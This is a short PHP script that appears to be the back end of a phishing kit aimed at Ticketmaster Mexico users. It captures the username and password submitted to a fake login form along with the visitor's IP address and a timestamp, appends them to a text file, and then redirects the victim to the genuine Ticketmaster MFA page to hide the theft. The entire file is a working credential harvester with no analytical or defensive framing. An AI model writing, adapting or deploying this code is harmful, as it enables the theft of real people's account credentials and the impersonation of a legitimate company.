<?php
$usuario = $_POST['user'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

$archivo = fopen("llaves_negras.txt", "a");
fwrite($archivo, "Fecha: $fecha | IP: $ip | User: $usuario | Pass: $password" . PHP_EOL);
fclose($archivo);

header("Location: https://identity.ticketmaster.com.mx/mfa"); 
exit();
?>
